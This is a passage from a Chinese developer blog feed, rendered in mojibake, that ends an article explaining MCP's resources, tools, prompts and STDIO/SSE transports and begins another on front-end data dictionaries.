â”‚  2. è·å–åæ ‡æ•°æ®     â”‚
â”‚  3. è¿”å›ç»“æœï¼š       â”‚
â”‚     116.397428,     â”‚
â”‚     39.90923        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â€‹
ç¬¬ 5 æ­¥ï¼šAI ç”Ÿæˆå‹å¥½å›å¤
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç”¨æˆ·çœ‹åˆ°çš„å›å¤ï¼š      â”‚
â”‚                     â”‚
â”‚  åŒ—äº¬å¤©å®‰é—¨çš„ç»çº¬åº¦æ˜¯ï¼š â”‚
â”‚   ç»åº¦ï¼š116.397428   â”‚
â”‚   çº¬åº¦ï¼š39.90923     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li>MCP å®¢æˆ·ç«¯è´Ÿè´£å’Œ AI æ¨¡å‹é€šä¿¡ï¼ˆè¿™éƒ¨åˆ†ç”¨çš„æ˜¯ Function Callï¼‰</li>
<li>MCP æœåŠ¡ç«¯è´Ÿè´£çœŸæ­£æ‰§è¡Œå·¥å…·é€»è¾‘ï¼ˆè°ƒç”¨çœŸå®çš„ APIï¼‰</li>
<li>ä¸­é—´çš„æ•°æ®ä¼ è¾“æŒ‰ç…§ MCP åè®®æ ‡å‡†è¿›è¡Œ</li>
</ul>
<blockquote>
<p>Tipï¼šMCP æ²¡æœ‰æ”¹å˜ AI çš„å†³ç­–è¿‡ç¨‹ï¼Œåªæ˜¯è§„èŒƒäº†â€å·¥å…·åˆ—è¡¨ â†’ AI å†³ç­– â†’ å·¥å…·æ‰§è¡Œâ€è¿™ä¸ªæµç¨‹çš„æ•°æ®æ ¼å¼ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-15">2.2 MCP çš„ä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µ</h3>
<p>MCP å®šä¹‰äº†ä¸‰ç§èƒ½åŠ›ç±»å‹ï¼Œç†è§£å®ƒä»¬åªéœ€è®°ä½ï¼šç»™ä»€ä¹ˆã€åšä»€ä¹ˆã€æ€ä¹ˆåšã€‚</p>
<h3 data-id="heading-16">Resourcesï¼ˆèµ„æºï¼‰â€”â€” ç»™ AI â€œçœ‹â€çš„ä¸œè¥¿</h3>
<p>ç®€å•è¯´ï¼šåªè¯»çš„æ•°æ®æºï¼ŒAI å¯ä»¥è¯»å–ä½†ä¸èƒ½ä¿®æ”¹ã€‚</p>
<p>å¸¸è§ä¾‹å­ï¼š</p>
<ul>
<li>æ–‡ä»¶å†…å®¹ï¼ˆä»£ç ã€æ–‡æ¡£ã€é…ç½®ï¼‰</li>
<li>æ•°æ®åº“è®°å½•ï¼ˆç”¨æˆ·æ•°æ®ã€è®¢å•ä¿¡æ¯ï¼‰</li>
<li>API å“åº”ï¼ˆç¬¬ä¸‰æ–¹æœåŠ¡è¿”å›çš„æ•°æ®ï¼‰</li>
</ul>
<p>ä½¿ç”¨åœºæ™¯ï¼šâ€åˆ†æä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶æœ‰ä»€ä¹ˆé—®é¢˜â€ â†’ AI è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆResourceï¼‰â†’ åˆ†æå¹¶ç»™å‡ºå»ºè®®</p>
<hr/>
<h3 data-id="heading-17">ï¸ Toolsï¼ˆå·¥å…·ï¼‰â€”â€” AI èƒ½â€åšâ€çš„äº‹æƒ…</h3>
<p>ç®€å•è¯´ï¼šå¯æ‰§è¡Œçš„å‡½æ•°ï¼ŒAI è°ƒç”¨åä¼šäº§ç”Ÿå®é™…æ•ˆæœã€‚</p>
<p>å¸¸è§ä¾‹å­ï¼š</p>
<ul>
<li>æŸ¥è¯¢åœ°ç†åæ ‡ã€è§„åˆ’è·¯çº¿</li>
<li>å‘é€é‚®ä»¶ã€åˆ›å»ºæ—¥å†äº‹ä»¶</li>
<li>è¯»å†™æ•°æ®åº“ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
</ul>
<p>ä½¿ç”¨åœºæ™¯ï¼šâ€å¸®æˆ‘æŸ¥åŒ—äº¬çš„å¤©æ°”â€ â†’ AI è°ƒç”¨å¤©æ°”æŸ¥è¯¢å·¥å…·ï¼ˆToolï¼‰â†’ è¿”å›å®æ—¶å¤©æ°”æ•°æ®</p>
<hr/>
<h3 data-id="heading-18">Promptsï¼ˆæç¤ºè¯æ¨¡æ¿ï¼‰â€”â€” æ ‡å‡†åŒ–çš„å·¥ä½œæµ</h3>
<p>ç®€å•è¯´ï¼šé¢„å®šä¹‰çš„å¯¹è¯æ¨¡æ¿ï¼Œç”¨æˆ·ä¸€é”®è§¦å‘å¸¸è§ä»»åŠ¡ã€‚</p>
<p>å¸¸è§ä¾‹å­ï¼š</p>
<ul>
<li>â€œä»£ç å®¡æŸ¥â€ï¼šè‡ªåŠ¨åˆ†ææ€§èƒ½ã€å®‰å…¨ã€å¯è¯»æ€§</li>
<li>â€œç”Ÿæˆæ–‡æ¡£â€ï¼šæ ¹æ®ä»£ç è‡ªåŠ¨ç”Ÿæˆ README</li>
<li>â€œBug è¯Šæ–­â€ï¼šç³»ç»ŸåŒ–æ’æŸ¥é—®é¢˜</li>
</ul>
<p>ä½¿ç”¨åœºæ™¯ï¼šç”¨æˆ·é€‰æ‹©â€ä»£ç å®¡æŸ¥â€æ¨¡æ¿ â†’ è‡ªåŠ¨å¡«å……ä»£ç  â†’ AI æŒ‰æ¨¡æ¿æ‰§è¡Œå®¡æŸ¥æµç¨‹</p>
<hr/>
<p>ä¸€å¥è¯åŒºåˆ†ï¼š</p>

























<table><thead><tr><th>æ¦‚å¿µ</th><th>ä¸€å¥è¯è¯´æ˜</th><th>æœ€å¸¸è§ç”¨é€”</th></tr></thead><tbody><tr><td>Resources</td><td>AI è¯»å–çš„æ•°æ®</td><td>è¯»å–æ–‡ä»¶ã€æŸ¥è¯¢æ•°æ®åº“</td></tr><tr><td>Tools</td><td>AI æ‰§è¡Œçš„æ“ä½œ</td><td>è°ƒç”¨å¤–éƒ¨ APIï¼ˆæœ€å¸¸ç”¨ï¼‰</td></tr><tr><td>Prompts</td><td>ç”¨æˆ·è§¦å‘çš„æ¨¡æ¿</td><td>æ ‡å‡†åŒ–å·¥ä½œæµ</td></tr></tbody></table>
<blockquote>
<p>Tipï¼šå®é™…ä½¿ç”¨ä¸­ Tools å  90% ï¼ŒResources é€‚åˆéœ€è¦å¤§é‡ä¸Šä¸‹æ–‡çš„åœºæ™¯ï¼ŒPrompts ç”¨äºå›ºå®šæµç¨‹ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-19">2.3 MCP çš„ä¼ è¾“æ–¹å¼</h3>
<p>MCP æ”¯æŒä¸¤ç§ä¸»æµä¼ è¾“æ–¹å¼ï¼ˆè¿˜æœ‰ç¬¬ä¸‰ç§ Streamable HTTPï¼Œä½†è¾ƒå°‘ç”¨ï¼‰ï¼Œç†è§£å®ƒä»¬åªéœ€è®°ä½ï¼šæœ¬åœ°è¿˜æ˜¯è¿œç¨‹ã€‚</p>
<h3 data-id="heading-20">æ–¹å¼ 1ï¼šSTDIO â€”â€” æœ¬åœ°è¿›ç¨‹é€šä¿¡</h3>
<p>ç®€å•è¯´ï¼šCursor å¯åŠ¨ä¸€ä¸ªæœ¬åœ°ç¨‹åºï¼ˆå¦‚ Node.js è„šæœ¬ï¼‰ï¼Œé€šè¿‡æ ‡å‡†è¾“å…¥è¾“å‡ºé€šä¿¡ã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼ˆè¯»å†™æ–‡ä»¶ã€æœç´¢ä»£ç ï¼‰</li>
<li>æœ¬åœ°æ•°æ®åº“æŸ¥è¯¢ï¼ˆSQLiteã€æœ¬åœ° MySQLï¼‰</li>
<li>å¼€å‘å’Œè°ƒè¯•è‡ªå·±çš„ MCP Server</li>
</ul>
<p>ä¼˜ç‚¹ï¼šå¿«ã€å®‰å…¨ã€ä¸éœ€è¦ç½‘ç»œ ç¼ºç‚¹ï¼šåªèƒ½æœ¬åœ°ç”¨ï¼Œéœ€è¦å®‰è£…ä¾èµ–</p>
<p>å…¸å‹é…ç½®ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2684de708c9e4b099c8bf15f3242231f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5peF5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765986704&amp;x-signature=NQBvP1E7w3nwtSc1AP8iDULr094%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-21">æ–¹å¼ 2ï¼šSSE â€”â€” è¿œç¨‹ HTTP æœåŠ¡</h3>
<p>ç®€å•è¯´ï¼šCursor é€šè¿‡ç½‘ç»œè®¿é—®è¿œç¨‹æœåŠ¡å™¨ï¼ˆå¦‚é«˜å¾·åœ°å›¾çš„äº‘ç«¯ APIï¼‰ã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>ç¬¬ä¸‰æ–¹æœåŠ¡ï¼ˆåœ°å›¾ã€å¤©æ°”ã€ç¿»è¯‘ï¼‰</li>
<li>ä¼ä¸šå†…éƒ¨ APIï¼ˆç»Ÿä¸€éƒ¨ç½²çš„å·¥å…·ï¼‰</li>
<li>ç”Ÿäº§ç¯å¢ƒï¼ˆå¤šäººå…±äº«åŒä¸€ä¸ªæœåŠ¡ï¼‰</li>
</ul>
<p>ä¼˜ç‚¹ï¼šå…å®‰è£…ã€å¯å…±äº«ã€æ˜“æ›´æ–° ç¼ºç‚¹ï¼šéœ€è¦ç½‘ç»œï¼Œæœ‰å»¶è¿Ÿ</p>
<p>å…¸å‹é…ç½®ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0b0f266d6ce4915aa6b80b370bc7695~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5peF5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765986704&amp;x-signature=lusQi%2F3%2FPGInSNQEDgL8UjZ59h0%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p>å¦‚ä½•é€‰æ‹©ï¼Ÿ</p>






























<table><thead><tr><th>ä½ çš„éœ€æ±‚</th><th>æ¨èæ–¹å¼</th><th>å…¸å‹ä¾‹å­</th></tr></thead><tbody><tr><td>è¯»å†™æœ¬åœ°æ–‡ä»¶</td><td>STDIO</td><td>æ–‡ä»¶æœç´¢ã€ä»£ç åˆ†æ</td></tr><tr><td>æŸ¥è¯¢æœ¬åœ°æ•°æ®åº“</td><td>STDIO</td><td>SQLiteã€æœ¬åœ° PostgreSQL</td></tr><tr><td>è°ƒç”¨ç¬¬ä¸‰æ–¹ API</td><td>SSE</td><td>é«˜å¾·åœ°å›¾ã€å¤©æ°”æœåŠ¡</td></tr><tr><td>å›¢é˜Ÿå…±äº«å·¥å…·</td><td>SSE</td><td>ä¼ä¸šå†…éƒ¨ APIã€ç»Ÿä¸€è®¤è¯</td></tr></tbody></table>
<blockquote>
<p>Tipï¼šè®°ä½ä¸€å¥è¯ï¼šæœ¬åœ°ç”¨ STDIOï¼Œè¿œç¨‹ç”¨ SSEã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-22">å†™åœ¨æœ€åï¼šçœ‹æ‡‚æœ¬è´¨ï¼Œå°‘è¸©å‘</h2>
<p>è¯»åˆ°è¿™é‡Œï¼Œä½ åº”è¯¥å·²ç»æ˜ç™½ï¼š</p>
<p>MCP ä¸æ˜¯ä»€ä¹ˆé»‘ç§‘æŠ€ï¼Œå®ƒå°±æ˜¯æŠŠ Function Call åŒ…äº†ä¸€å±‚æ ‡å‡†åŒ–åè®®ã€‚ MCP ä¸ä¼šè®© AI å˜èªæ˜ï¼Œè¯¥é€‰é”™å·¥å…·è¿˜æ˜¯ä¼šé€‰é”™ï¼Œè¯¥æå–é”™å‚æ•°è¿˜æ˜¯ä¼šæå–é”™ã€‚ MCP ä¹Ÿä¸æ˜¯å…è´¹åˆé¤ï¼ŒAPI è°ƒç”¨æˆæœ¬è¯¥è°ä»˜è¿˜æ˜¯è°ä»˜ã€‚</p>
<p>é‚£ä¸ºä»€ä¹ˆè¿˜è¦äº†è§£ MCPï¼Ÿ</p>
<p>å› ä¸ºå®ƒä»£è¡¨äº†ä¸€ä¸ªè¶‹åŠ¿ï¼šAI å·¥å…·ç”Ÿæ€çš„æ ‡å‡†åŒ–ã€‚å°±åƒå½“å¹´çš„ USB æ ‡å‡†ï¼Œè™½ç„¶æŠ€æœ¯ä¸Šæ²¡ä»€ä¹ˆåˆ›æ–°ï¼Œä½†ç»Ÿä¸€äº†æ¥å£ï¼Œè®©æ•´ä¸ªç”Ÿæ€ç¹è£èµ·æ¥ã€‚</p>
<hr/>
<h3 data-id="heading-23">ç»™ä½ ä¸‰ä¸ªå»ºè®®</h3>
<ol>
<li>ä¸è¦ç›²ç›®è¿½æ–°</li>
</ol>
<p>çœ‹åˆ° MCP ç«äº†å°±è§‰å¾—å¿…é¡»ç”¨ï¼Œè¿™æ˜¯æœ€å¤§çš„è¯¯åŒºã€‚å¦‚æœä½ çš„é¡¹ç›®ï¼š</p>
<ul>
<li>å·¥å…·å°±å‡ ä¸ªï¼Œéƒ½æ˜¯è‡ªå·±çš„ API</li>
<li>ä¸€ä¸ªäººå¼€å‘ï¼Œä¸éœ€è¦å›¢é˜Ÿåä½œ</li>
<li>å¯¹å·¥å…·è°ƒç”¨æœ‰æ·±åº¦å®šåˆ¶éœ€æ±‚</li>
</ul>
<p>é‚£è‡ªå·±å®ç° Function Call å¯èƒ½æ›´åˆé€‚ï¼ŒæŒæ§åŠ›æ›´å¼ºï¼Œè°ƒè¯•ä¹Ÿæ›´æ–¹ä¾¿ã€‚</p>
<hr/>
<ol start="2">
<li>ä¹Ÿä¸è¦ä¸€æ£å­æ‰“æ­»</li>
</ol>
<p>å¦‚æœä½ éœ€è¦å¿«é€Ÿæ¥å…¥ï¼š</p>
<ul>
<li>é«˜å¾·åœ°å›¾ã€ç™¾åº¦åœ°å›¾è¿™ç±»ç°æˆæœåŠ¡</li>
<li>å›¢é˜Ÿå…±äº«çš„æ ‡å‡†åŒ–å·¥å…·</li>
<li>å¼€æºç¤¾åŒºæä¾›çš„ MCP Server</li>
</ul>
<p>é‚£ MCP èƒ½å¸®ä½ çœä¸å°‘äº‹ï¼Œä¸ç”¨ç ”ç©¶æ¯ä¸ª API çš„æ–‡æ¡£ï¼Œè£…ä¸Šå°±èƒ½ç”¨ã€‚</p>
<hr/>
<ol start="3">
<li>æ··åˆç­–ç•¥æœ€åŠ¡å®</li>
</ol>
<p>æ ¸å¿ƒä¸šåŠ¡é€»è¾‘è‡ªå·±æŒæ§ï¼Œé€šç”¨èƒ½åŠ›ç”¨ MCP å¿«é€Ÿæ¥å…¥ã€‚</p>
<p>æ¯”å¦‚ä½ åšä¸€ä¸ªæ™ºèƒ½å®¢æœï¼š</p>
<ul>
<li>æŸ¥è®¢å•ã€æŸ¥åº“å­˜ â†’ è‡ªå·±å®ç°ï¼ˆæ ¸å¿ƒä¸šåŠ¡ï¼‰</li>
<li>åœ°å›¾å¯¼èˆªã€å¤©æ°”æŸ¥è¯¢ â†’ ç”¨ MCPï¼ˆé€šç”¨èƒ½åŠ›ï¼‰</li>
<li>å‘é‚®ä»¶ã€å‘çŸ­ä¿¡ â†’ ç”¨ MCPï¼ˆæ ‡å‡†åŒ–æ“ä½œï¼‰</li>
</ul>
<p>è¿™æ ·æ—¢èƒ½ä¿è¯æ ¸å¿ƒç«äº‰åŠ›ï¼Œåˆèƒ½äº«å—ç”Ÿæ€çº¢åˆ©ã€‚</p>
<hr/>
<h3 data-id="heading-24">æœ€åä¸€å¥è¯</h3>
<p>MCP æ˜¯ä¸ªå¥½åè®®ï¼Œä½†ä¸è¦ç¥åŒ–å®ƒã€‚</p>
<p>æŠ€æœ¯æ°¸è¿œæ˜¯ä¸ºä¸šåŠ¡æœåŠ¡çš„ã€‚ç†è§£å®ƒçš„æœ¬è´¨ï¼Œçœ‹æ¸…å®ƒçš„è¾¹ç•Œï¼Œåœ¨åˆé€‚çš„åœºæ™¯ç”¨å¥½å®ƒâ€”â€”è¿™æ‰æ˜¯å·¥ç¨‹å¸ˆè¯¥æœ‰çš„æ€åº¦ã€‚</p>
<p>å°±åƒä½ ä¸ä¼šå› ä¸º USB å‡ºç°äº†ï¼Œå°±æŠŠæ‰€æœ‰è®¾å¤‡éƒ½æ¢æˆ USB æ¥å£ã€‚æœ‰äº›åœºæ™¯è¯¥ç”¨é›·ç”µå£è¿˜å¾—ç”¨é›·ç”µå£ï¼Œæœ‰äº›åœºæ™¯å¹²è„†ç›´æ¥ç„Šçº¿æ›´å¯é ã€‚</p>
<p>å·¥å…·æ˜¯æ­»çš„ï¼Œäººæ˜¯æ´»çš„ã€‚åˆ«è®©å·¥å…·æ¡†ä½äº†æ€ç»´ã€‚</p>
<hr/>
<h2 data-id="heading-25">å‚è€ƒèµ„æ–™</h2>
<p>å®˜æ–¹æ–‡æ¡£</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">Anthropic MCP åè®®è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs%2Fcontext%2Fmcp" target="_blank" title="https://cursor.com/cn/docs/context/mcp" ref="nofollow noopener noreferrer">Cursor MCP æ–‡æ¡£</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs%2Fcontext%2Fmcp" target="_blank" title="https://cursor.com/cn/docs/context/mcp" ref="nofollow noopener noreferrer">Model Context Protocol (MCP) | Cursor Docs</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs%2Fcontext%2Fmcp" target="_blank" title="https://cursor.com/cn/docs/context/mcp" ref="nofollow noopener noreferrer">Cursor MCP æ–‡æ¡£</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯æ•°æ®å­—å…¸æŠ€æœ¯æ–¹æ¡ˆå®æˆ˜]]></title>    <link>https://juejin.cn/post/7581750253000425507</link>    <guid>https://juejin.cn/post/7581750253000425507</guid>    <pubDate>2025-12-10T02:24:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000425507" data-draft-id="7581752787564052520" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯æ•°æ®å­—å…¸æŠ€æœ¯æ–¹æ¡ˆå®æˆ˜"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-10T02:24:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ ‘æ·±é‡é¹¿"/> <meta itemprop="url" content="https://juejin.cn/user/3281394147006381"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯æ•°æ®å­—å…¸æŠ€æœ¯æ–¹æ¡ˆå®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3281394147006381/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ ‘æ·±é‡é¹¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:24:05.000Z" title="Wed Dec 10 2025 02:24:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"â‡²"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"â€¢";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨åå°ä¸ä¸­å°ç³»ç»Ÿå¼€å‘é¢†åŸŸï¼Œæ•°æ®å­—å…¸æ˜¯æä¸ºå¸¸è§ä¸”è‡³å…³é‡è¦çš„æ¦‚å¿µï¼Œç›¸ä¿¡å¤§å¤šæ•°ä»äº‹ç›¸å…³å¼€å‘å·¥ä½œçš„æœ‹å‹éƒ½å¯¹å…¶è€³ç†Ÿèƒ½è¯¦ã€‚å‡ ä¹æ¯ä¸€ä¸ªæˆç†Ÿçš„é¡¹ç›®ï¼Œéƒ½ä¼šä¸“é—¨è®¾ç½®ä¸€ä¸ªå­—å…¸æ¨¡å—ï¼Œç”¨äºç²¾å¿ƒç»´æŠ¤å„ç±»å­—å…¸æ•°æ®ã€‚è¿™äº›å­—å…¸æ•°æ®åœ¨ç³»ç»Ÿä¸­æ‰®æ¼”ç€ä¸¾è¶³è½»é‡çš„è§’è‰²ï¼Œä¸ºä¸‹æ‹‰æ¡†ã€è½¬ä¹‰å€¼ã€å•é€‰æŒ‰é’®ç­‰ç»„ä»¶æä¾›äº†ä¸å¯æˆ–ç¼ºçš„åŸºç¡€æ•°æ®æ”¯æ’‘ã€‚</p>
